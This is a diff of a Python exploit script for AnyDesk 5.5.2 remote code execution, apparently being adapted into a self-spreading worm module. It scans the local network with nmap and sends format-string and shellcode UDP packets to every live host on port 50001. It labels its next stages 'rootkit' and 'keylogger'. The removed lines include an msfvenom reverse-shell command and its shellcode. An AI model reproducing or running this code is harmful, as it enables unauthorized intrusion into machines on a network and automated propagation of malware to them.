@@ -1,11 +1,3 @@
-# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
-# Date: 09/06/20
-# Exploit Author: scryh
-# Vendor Homepage: https://anydesk.com/en
-# Version: 5.5.2
-# Tested on: Linux
-# Walkthrough: https://devel0pment.de/?p=1881
-
 #!/usr/bin/env python
 import struct
 import socket
@@ -25,12 +17,12 @@ def get_network(interface):
     network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
     return network
 
-def port_scan(network, port):
+def net_scan(network):
     try:
         print('Scanning Network')
         # Run nmap and pipe its output to awk
-        command = f'nmap -oG - -p {port} {network} | awk \'/Up$/{{print $2}}\''
-        output = subprocess.check_output(command, shell=True, text=True)
+        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
+        output = subprocess.check_output(command, shell=True, universal_newlines=True)
 
         # Split the output by newlines to get a list of IPs
         ip_addresses = output.strip().split('\n')
@@ -75,42 +67,46 @@ def gen_discover_packet(ad_id, os, hn, user, inf, func):
     d += bytes([0x2, 0xc3, 0x51])
     return d
 
-
-# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+#msfvenom -p linux/x64/exec CMD="touch ./youarefucked.txt" -b "\x00\x25\x26" -f python -v shellcode 
 shellcode =  b""
-shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
-shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xee\xca\xd4"
-shellcode += b"\xb4\xc6\x9c\x61\x2d\x48\x31\x58\x27\x48\x2d"
-shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x84\xe3\x8c\x2d\xac"
-shellcode += b"\x9e\x3e\x47\xef\x94\xdb\xb1\x8e\x0b\x29\x94"
-shellcode += b"\xec\xca\xc5\xe8\xcc\x9c\x63\x28\xbf\x82\x5d"
-shellcode += b"\x52\xac\x8c\x3b\x47\xc4\x92\xdb\xb1\xac\x9f"
-shellcode += b"\x3f\x65\x11\x04\xbe\x95\x9e\x93\x64\x58\x18"
-shellcode += b"\xa0\xef\xec\x5f\xd4\xda\x02\x8c\xa3\xba\x9b"
-shellcode += b"\xb5\xf4\x61\x7e\xa6\x43\x33\xe6\x91\xd4\xe8"
-shellcode += b"\xcb\xe1\xcf\xd4\xb4\xc6\x9c\x61\x2d"
+shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48"
+shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x61\x62\x1e"
+shellcode += b"\xd3\x68\x19\x4c\xf0\x48\x31\x58\x27\x48\x2d"
+shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x29\xda\x31\xb1\x01"
+shellcode += b"\x77\x63\x83\x09\x62\x87\x83\x3c\x46\x1e\x96"
+shellcode += b"\x09\x4f\x7d\x87\x36\x4b\xa4\xe9\x61\x62\x1e"
+shellcode += b"\xa7\x07\x6c\x2f\x98\x41\x4c\x31\xaa\x07\x6c"
+shellcode += b"\x2d\x82\x04\x04\x6b\xb0\x03\x7c\x28\xde\x15"
+shellcode += b"\x1a\x6a\xd3\x3e\x4e\x18\xae\x0b\x59\x46\xdc"
+shellcode += b"\x6d\x19\x4c\xf0"
 
-#def run():
-#    next_action = ""
-#    data = ""
-#    print("[+] Propagation module activated...")
+def run():
+    next_action = ""
+    data = ""
+    print("[+] Propagation module activated...")
 
-try:
+    # try:
     interface = get_interface()
     network = get_network(interface)
     port = 50001  # Define the port to scan
-    neighbors = port_scan(network, port)
+    neighbors = net_scan(network)
     print('Lets attack')
     print('Brute all active Hosts on Port 50001')
     
     for ip in neighbors:
-        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
+        print(f'IP: {ip}')
+        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln'+shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
         s.close()
-        
-except Exception as e:
-    exit()
+            
+    # except Exception as e: 
+    #     print(e)
+    #     pass
+        # exit()
 
-#    next_action = "rootkit"
-#    return data, next_action
+    next_action = "keylogger"
+    return data, next_action
+
+if __name__ == '__main__':
+    run()
